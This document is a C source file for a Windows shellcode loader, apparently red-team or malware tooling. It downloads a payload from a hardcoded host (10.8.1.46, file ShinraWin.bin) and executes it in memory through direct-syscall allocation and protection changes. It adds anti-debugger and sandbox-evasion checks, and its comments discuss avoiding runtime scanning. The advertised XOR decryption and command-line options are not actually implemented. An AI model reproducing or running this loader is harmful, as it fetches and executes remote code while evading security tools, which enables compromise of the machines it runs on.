/**
 * Shellcode Loader for Donut Shellcode
 * Loads and executes shellcode from a local file or URL
 * Supports XOR-encrypted shellcode
 * It's worth noting that shellcode will be detected on execution if it doesn't avoid runtime scanning.
 * From testing this was only an issue with C# payloads such as SharpEfsPotato.
 *
 * Usage:
 *   loader.exe /p:FILETOLOAD [/e:XOR_KEY]
 *   loader.exe /p:http://example.com/FILETOLOAD [/e:XOR_KEY]
 */

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include "syscalls_mem.h"


 // Maximum size for shellcode (20MB)
#define MAX_SHELLCODE_SIZE (20 * 1024 * 1024)
// Maximum URL length
#define MAX_URL_LENGTH 2048
// Maximum file path length
#define MAX_PATH_LENGTH 260
// Maximum XOR key length
#define MAX_XOR_KEY_LENGTH 256


/**
 * Download shellcode from a URL using WinHTTP
 *
 * @param url The URL to download from
 * @param shellcode Pointer to buffer where shellcode will be stored
 * @param shellcodeSize Pointer to variable that will store the size of the shellcode
 * @return TRUE if download successful, FALSE otherwise
 */
static BOOL DownloadShellcode(const char* url, PBYTE shellcode, DWORD* shellcodeSize) {
    typedef HINTERNET(WINAPI* pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
    typedef HINTERNET(WINAPI* pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
    typedef HINTERNET(WINAPI* pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
    typedef BOOL(WINAPI* pWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
    typedef BOOL(WINAPI* pWinHttpReceiveResponse)(HINTERNET, LPVOID);
    typedef BOOL(WINAPI* pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
    typedef BOOL(WINAPI* pWinHttpCloseHandle)(HINTERNET);
    typedef BOOL(WINAPI* pWinHttpCrackUrl)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);

    // Explicitly load winhttp.dll (required if not already loaded by another module)
    HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
    if (!hWinHttp) {
        printf("[-] Failed to load winhttp.dll: %d\n", GetLastError());
        return FALSE;
    }

    // Dynamically resolve all necessary WinHTTP functions
    pWinHttpOpen _WinHttpOpen = (pWinHttpOpen)GetProcAddress(hWinHttp, "WinHttpOpen");
    pWinHttpConnect _WinHttpConnect = (pWinHttpConnect)GetProcAddress(hWinHttp, "WinHttpConnect");
    pWinHttpOpenRequest _WinHttpOpenRequest = (pWinHttpOpenRequest)GetProcAddress(hWinHttp, "WinHttpOpenRequest");
    pWinHttpSendRequest _WinHttpSendRequest = (pWinHttpSendRequest)GetProcAddress(hWinHttp, "WinHttpSendRequest");
    pWinHttpReceiveResponse _WinHttpReceiveResponse = (pWinHttpReceiveResponse)GetProcAddress(hWinHttp, "WinHttpReceiveResponse");
    pWinHttpReadData _WinHttpReadData = (pWinHttpReadData)GetProcAddress(hWinHttp, "WinHttpReadData");
    pWinHttpCloseHandle _WinHttpCloseHandle = (pWinHttpCloseHandle)GetProcAddress(hWinHttp, "WinHttpCloseHandle");
    pWinHttpCrackUrl _WinHttpCrackUrl = (pWinHttpCrackUrl)GetProcAddress(hWinHttp, "WinHttpCrackUrl");

    if (!_WinHttpOpen || !_WinHttpConnect || !_WinHttpOpenRequest || !_WinHttpSendRequest ||
        !_WinHttpReceiveResponse || !_WinHttpReadData || !_WinHttpCloseHandle || !_WinHttpCrackUrl) {
        printf("[-] Failed to resolve one or more WinHTTP functions\n");
        FreeLibrary(hWinHttp);
        return FALSE;
    }

    BOOL result = FALSE;
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    URL_COMPONENTS urlComp = { 0 };
    WCHAR hostName[256] = { 0 };
    WCHAR urlPath[1024] = { 0 };
    DWORD bytesRead = 0;
    DWORD totalBytesRead = 0;
    LPCWSTR httpVerb = L"GET";
    DWORD flags = WINHTTP_FLAG_REFRESH;

    // Convert ANSI URL to wide string
    int urlLen = (int)strlen(url) + 1;
    WCHAR wUrl[2084] = { 0 };
    if (MultiByteToWideChar(CP_ACP, 0, url, urlLen, wUrl, 2084) == 0) {
        printf("[-] Failed to convert URL to wide string: %d\n", GetLastError());
        FreeLibrary(hWinHttp);
        return FALSE;
    }

    // Setup URL components
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName) / sizeof(WCHAR);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath) / sizeof(WCHAR);

    // Crack the URL into components
    if (!_WinHttpCrackUrl(wUrl, 0, 0, &urlComp)) {
        printf("[-] WinHttpCrackUrl failed: %d\n", GetLastError());
        FreeLibrary(hWinHttp);
        return FALSE;
    }

    // Initialize WinHTTP session
    hSession = _WinHttpOpen(L"ShellcodeLoader/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (hSession == NULL) {
        printf("[-] WinHttpOpen failed: %d\n", GetLastError());
        FreeLibrary(hWinHttp);
        return FALSE;
    }

    // Connect to the host
    hConnect = _WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
    if (hConnect == NULL) {
        printf("[-] WinHttpConnect failed: %d\n", GetLastError());
        goto cleanup;
    }

    // Determine HTTP method and flags
    if (urlComp.nScheme == INTERNET_SCHEME_HTTPS) {
        flags |= WINHTTP_FLAG_SECURE;
    }

    // Open the request
    hRequest = _WinHttpOpenRequest(hConnect, httpVerb, urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (hRequest == NULL) {
        printf("[-] WinHttpOpenRequest failed: %d\n", GetLastError());
        goto cleanup;
    }

    // Send the request
    if (!_WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        printf("[-] WinHttpSendRequest failed: %d\n", GetLastError());
        goto cleanup;
    }

    // Receive response
    if (!_WinHttpReceiveResponse(hRequest, NULL)) {
        printf("[-] WinHttpReceiveResponse failed: %d\n", GetLastError());
        goto cleanup;
    }

    // Read the response body
    while (totalBytesRead < MAX_SHELLCODE_SIZE) {
        if (!_WinHttpReadData(hRequest, shellcode + totalBytesRead, MAX_SHELLCODE_SIZE - totalBytesRead, &bytesRead)) {
            printf("[-] WinHttpReadData failed: %d\n", GetLastError());
            goto cleanup;
        }

        if (bytesRead == 0) {
            result = TRUE;
            break;
        }

        totalBytesRead += bytesRead;
    }

    if (totalBytesRead >= MAX_SHELLCODE_SIZE) {
        printf("[-] Shellcode too large\n");
        goto cleanup;
    }

    *shellcodeSize = totalBytesRead;
    printf("[+] Downloaded %d bytes from %s\n", totalBytesRead, url);

cleanup:
    if (hRequest) _WinHttpCloseHandle(hRequest);
    if (hConnect) _WinHttpCloseHandle(hConnect);
    if (hSession) _WinHttpCloseHandle(hSession);
    FreeLibrary(hWinHttp);

    return result;
}

/**
 * Execute the shellcode
 *
 * @param shellcode The shellcode to execute
 * @param shellcodeSize Size of the shellcode
 * @return TRUE if execution successful, FALSE otherwise
 */
static BOOL ExecuteShellcode(PBYTE shellcode, DWORD shellcodeSize) {
    BOOL result = FALSE;
    PVOID execMem = NULL;
    HANDLE hProcess = (HANDLE)-1;
    SIZE_T regionSize = shellcodeSize;
    ULONG oldProtect;
    NTSTATUS status;

    status = Sw3NtAllocateVirtualMemory(hProcess, &execMem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        printf("[-] NtAllocateVirtualMemory failed: 0x%X\n", status);
        return FALSE;
    }

    memcpy(execMem, shellcode, shellcodeSize);

    status = Sw3NtProtectVirtualMemory(hProcess, &execMem, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) {
        printf("[-] NtProtectVirtualMemory failed: 0x%X\n", status);
        goto cleanup;
    }

    printf("[+] Executing shellcode...\n");

    ((void(*)())execMem)();

    result = TRUE;

cleanup:
    return result;
}

/**
 * Main function
 *
 * @param argc Number of command line arguments
 * @param argv Array of command line arguments
 * @return 0 if successful, non-zero otherwise
 */
int main(int argc, char* argv[]) {
    BYTE* shellcode = NULL;
    DWORD shellcodeSize = 0;
    char path[MAX_URL_LENGTH] = { 0 };
    char xorKey[MAX_XOR_KEY_LENGTH] = { 0 };
    BOOL result = FALSE;

    // Don't run if debugger attached
    if (IsDebuggerPresent()) {
        return 1;
    }

    // Simple sandbox evasion
    DWORD64 start = GetTickCount64();
    Sleep(5000);
    DWORD64 end = GetTickCount64();
    if ((end - start) < 4500) {
        return 1;
    }

    // Allocate shellcode buffer on heap instead of stack to prevent stack overflow
    shellcode = (BYTE*)malloc(MAX_SHELLCODE_SIZE);
    if (shellcode == NULL) {
        printf("[-] Failed to allocate memory for shellcode\n");
        return 1;
    }

    // Zero the memory
    memset(shellcode, 0, MAX_SHELLCODE_SIZE);

    result = DownloadShellcode("http://10.8.1.46:1024/ShinraWin.bin", shellcode, &shellcodeSize);

    if (!result || shellcodeSize == 0) {
        printf("[-] Failed to load shellcode\n");
        free(shellcode);
        return 1;
    }

    // Execute the shellcode
    result = ExecuteShellcode(shellcode, shellcodeSize);
    if (!result) {
        printf("[-] Failed to execute shellcode\n");
        free(shellcode);
        return 1;
    }

    // Note: We intentionally don't free shellcode here since ExecuteShellcode might still be using it.
    return 0;
}
